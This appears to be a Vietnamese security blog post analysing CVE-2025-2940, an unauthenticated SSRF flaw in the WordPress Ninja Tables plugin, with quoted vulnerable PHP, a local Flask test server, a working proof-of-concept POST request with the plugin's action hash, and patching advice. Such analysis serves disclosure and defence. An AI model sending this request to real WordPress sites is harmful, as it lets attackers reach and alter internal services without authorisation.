# CVE-2025-2940 Analysis & POC


<!--more-->

## CVE & Basic Info
Plugin **Ninja Tables – Easy Data Table Builder** cho WordPress tồn tại lỗ hổng **Server-Side Request Forgery (SSRF)** trong tất cả các phiên bản cho đến và bao gồm **5.0.18**, thông qua tham số `args[url]`. Lỗ hổng này cho phép **unauthenticated attackers** thực hiện các **web requests** đến các **arbitrary locations** bắt nguồn từ **web application**, và có thể được sử dụng để **query** và **modify** thông tin từ các **internal services**.

* **CVE ID**: [CVE-2025-2940](https://www.cve.org/CVERecord?id=CVE-2025-2940)
* **Vulnerability Type**: Server Side Request Forgery (SSRF)
* **Affected Versions**: <= 5.0.18
* **Patched Versions**: 5.0.19
* **CVSS severity**: Medium (7.2)
* **Required Privilege**: Unauthenticated
* **Product**: [WordPress Ninja Tables Plugin](https://wordpress.org/plugins/ninja-tables/)

## Requirements
* **Local WordPress & Debugging**: [Local WordPress and Debugging](https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/).
* **Plugin versions** - **Ninja Tables**: **5.0.18** (vulnerable) và **5.0.19** (patched).
* **Diff tool** - [**Meld**](https://meldmerge.org/) hoặc bất kỳ công cụ so sánh (diff) nào để kiểm tra và so sánh khác biệt giữa hai phiên bản.

## Analysis

### Patch diff

Theo mô tả của CVE, vị trí đáng chú ý trong patch là chỗ mã xử lý `args[url]` — đây có thể là nguyên nhân chính dẫn đến lỗ hổng vì tham số này được sử dụng trực tiếp trong luồng thực hiện request.

![Patch diff](diff.png "Vị trí tiền đề gây ra lỗ hổng")

Trong bản vá, đoạn mã dễ bị lợi dụng này đã được vô hiệu hoá (comment bằng `//`).

### Vulnerable Code 

```php {title="Client.php - v5.0.18" hl_lines=[3,5,7,13,15,16,17,21] data-open=true}
public static function registerAsyncRequestHandler()
{
    $action = static::makeAsyncRequestAction();

    App::addAction("admin_post_nopriv_{$action}", function() {
        
        $request = App::make('request');
        
        $requestUrl = $request->get('args.url');
        
        $requestMethod = $request->get('args.method');
        
        $client = Client::make($requestUrl);
        
        $params = $request->except(
            'action', 'args.url', 'args.method',
        )['args'];

        $callback = static::getCallback($params);

        $response = $client->{$requestMethod}('', $params);

        if (is_wp_error($response)) {
            $exception = new Exception(
                $response->get_error_message(), 500
            );
        }

        return $callback($response, $exception ?? null);
    });
}
```

Hàm `registerAsyncRequestHandler()` là một trình đăng ký để tạo và xử lý một endpoint async trong WordPress - cụ thể là qua `admin_post_nopriv_{action}`, tức là hook cho phép người dùng chưa đăng nhập (`nopriv`) cũng có thể gửi request đến.

Cụ thể, hàm sẽ xử lý như sau:

1. **Tạo tên `action` duy nhất cho plugin**

```php {.no-header}
$action = static::makeAsyncRequestAction();

protected static function makeAsyncRequestAction()
{
    return 'wpf-async-request-' . sha1(
        App::config()->get('app.slug') // plugin name: ninja-tables
    );
}
```

Hàm `makeAsyncRequestAction()` tạo ra một chuỗi định danh duy nhất cho plugin bằng cách nối tiền tố cố định (`wpf-async-request-`) với giá trị **SHA1 hash** của tên plugin (`app.slug`).

Vì plugin hiện tại có tên là `"ninja-tables"`, nên kết quả trả về sẽ là:

```{.no-header}
wpf-async-request-5198d2fbe51aebbce20ad69b9ada4d77993bbc77
```

2. **Đăng ký action hook với callback là Anonymous function**

```php {.no-header}
App::addAction("admin_post_nopriv_{$action}", function() { ... });
```

Khi có HTTP request gửi đến endpoint `/wp-admin/admin-post.php?action=wpf-async-request-5198d2fbe51aebbce20ad69b9ada4d77993bbc77` thì logic trong anonymous function sẽ được gọi.

3. **Lấy instance của `Request object` từ container `App` và lấy 2 tham số chính**

```php {.no-header}
$request = App::make('request');
$requestUrl = $request->get('args.url');
$requestMethod = $request->get('args.method');
```

4. **Khởi tạo đối tượng `Client` với `baseUrl` lấy từ request**

```php {.no-header}
$client = Client::make($requestUrl);

public static function make($baseUrl = '', $args = [])
{
    $args['cookies'] = $args['cookies'] ?? [];
    $args['headers'] = $args['headers'] ?? [];
    $args['options'] = $args['options'] ?? [];
    return new static($baseUrl, $args);
}
```

Phương thức `Client::make()` chịu trách nhiệm **tạo và cấu hình một instance mới của lớp `Client`**, dùng để quản lý và gửi các HTTP request.
Giá trị `$baseUrl` được truyền trực tiếp từ `$requestUrl` - tức là URL mà người dùng cung cấp trong tham số `args.url`.

5. **Lấy tất cả tham số khác ngoài `action`, `args.url`, `args.method`**

```php {.no-header}
$params = $request->except(
    'action', 'args.url', 'args.method',
)['args'];
```

6. **Giải mã và lấy hàm callback từ tham số request**

```php {.no-header}
$callback = static::getCallback($params);

protected static function getCallback(&$params)
{
    $callback = unserialize(base64_decode($params['callback']));
    unset($params['callback']);
    return $callback;
}
```

Phương thức `getCallback()` dùng để **trích xuất hàm callback** được gửi kèm trong tham số `args.callback` của request.

7. **Gọi đến hàm `$requestMethod` với đối số `$params`**

```php {.no-header}
$response = $client->{$requestMethod}('', $params);
```

Ví dụ: `$requestMethod` là `POST` => `$response = $client->POST('', $params)`

8. **Kiểm tra lỗi và trả về**

```php {.no-header}
if (is_wp_error($response)) {
    $exception = new Exception(
        $response->get_error_message(), 500
    );
}

return $callback($response, $exception ?? null);
```

{{< admonition question >}}
Điều gì xảy ra nếu `$requestMethod` không tồn tại, tức `$client` gọi đến một phương thức không có trong class `Client`?

Trong trường hợp này, PHP sẽ tự động gọi **hàm magic `__call()`** được khai báo trong class `Client`.
Hàm `__call()` được thiết kế để xử lý tất cả các lời gọi phương thức **không tồn tại**, cho phép `Client` thực hiện request động dựa trên tên phương thức được gọi.
>
Quan sát **Outline tab** ta thấy được tất cả các **method**, **property** và các **hàm** trong file theo thứ tự.

![Outline](outline.png "Outline của file Client.php")
{{< /admonition >}}

```php {title="Client.php - v5.0.18" hl_lines=[3,18,27] data-open=true}
public function __call($method, $args)
{
    if ($method === 'download') {
        return $this->downloadFile(...$args);
    }
    
    // Handles dynamic method calls like:
    // asyncGet, asyncPost and so on
    // get, post and so on
    $url = array_shift($args);

    $parsed = parse_url($url);

    if (!isset($parsed['scheme'])) {
        $url = trim($this->baseUrl, '/') . '/' . trim($url, '/');
    }

    if (str_starts_with($method, 'async')) {
        $method = substr($method, strlen('async'));
        $this->checkIfValidHttpMethod($method);
        return $this->asyncRequest(
            $url, $this->buildRequestArgs($args, $method)
        );
    }
    
    $this->checkIfValidHttpMethod($method);
    return $this->request(
        $url, $this->buildRequestArgs($args, $method)
    );
}
```

Hàm `__call()` sẽ gọi đến `request()` nếu method không phải `download` và không bắt đầu bằng `async` với url được set trước đó.

```php {title="Client.php - v5.0.18" hl_lines=[3,7] data-open=true}
protected function request($url, $args = [])
{
    if ($query = http_build_query($this->query)) {
        $url .= '?' . $query;
    }

    $response = wp_remote_request($url, $args);

    if (is_wp_error($response)) {
        throw new Exception($response->get_error_message(), 500);
    }
    
    $this->cookies = array_merge(
        $this->cookies,
        wp_remote_retrieve_cookies($response)
    );

    return $this->makeResponse($response);
}
```

`request()` thực hiện **build query** và gửi request bằng `wp_remote_request()` - hàm chính dẫn tới **SSRF**

### Flow

{{< mermaid >}}
graph TD
A["HTTP Request"] --> B["admin_post_nopriv_{action}"]
B --> C["$request->get('args.url') / $request->get('args.method')"]
C --> D["$client->{$requestMethod}('', $params)"]
D --> E["Client::__call() → request() → wp_remote_request() ← SSRF sink"]
E --> F["Response → callback → HTTP Response"]
{{< /mermaid >}}

## Exploit

### Local Server
Tạo local service đơn giản bằng python

```py
from flask import Flask, send_from_directory
import os

BASE_DIR = os.path.abspath(os.getcwd())
app = Flask(__name__)

@app.route('/metadata')
def metadata():
    return send_from_directory(BASE_DIR, 'metadata.json', as_attachment=True)

@app.route('/delete')
def delete():
    file_id = request.args.get('id')
    if not file_id:
        return "No id provided", 400
    print(f"delete it: {file_id}")
    return f"Delete it: {file_id}"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8001, debug=True)
```

```json {title="metadata.json"}
{
  "content": "Internal service data"
}
```

### Proof of Concept (PoC)

Gửi POST request với URL trỏ đến local service:

```
POST /wp-admin/admin-post.php HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 
Accept: */*
Content-Type: application/x-www-form-urlencoded
Content-Length: 146
Connection: close

action=wpf-async-request-5198d2fbe51aebbce20ad69b9ada4d77993bbc77&args[url]=http://localhost:8001/delete?id=1&args[method]=GET&args[name]=Tokuda
```

**Result**:

![Result](result.png "GET request tới local service")

## Conclusion

Lỗ hổng SSRF trong **Ninja Tables ≤ 5.0.18** cho thấy tham số `args[url]` do client cung cấp được sử dụng trực tiếp để thực hiện request phía server mà không kiểm tra, cho phép attacker (không cần xác thực) buộc ứng dụng truy cập tới địa chỉ tùy ý. Bản vá **≥ 5.0.19** đã loại bỏ đoạn mã nguy hiểm và khắc phục vector này.

## Key takeaways

* Nâng cấp ngay lên **5.0.19** hoặc mới hơn.
* Không dùng trực tiếp input của client làm URL cho request — validate/normalize trước khi sử dụng.
* Áp dụng allowlist cho host/port và chặn private IP ranges (127.0.0.0/8, 10.0.0.0/8, 192.168.0.0/16, v.v.).
* Tránh đăng ký endpoint `admin_post_nopriv_*` cho chức năng thực hiện outbound request hoặc thêm kiểm soát quyền/CSRF.

## References

[SSRF (Server Side Request Forgery) — Hacktrick](https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/index.html)

[WordPress Ninja Tables Plugin <= 5.0.18 is vulnerable to Server Side Request Forgery (SSRF)](https://patchstack.com/database/wordpress/plugin/ninja-tables/vulnerability/wordpress-ninja-tables-easy-data-table-builder-plugin-5-0-18-unauthenticated-server-side-request-forgery-vulnerability) 

---

> Tác giả: [Bui Van Y](github.com/w41bu1)  
> URL: http://localhost:1313/vi/posts/2025-11-03-cve-2025-2940/  

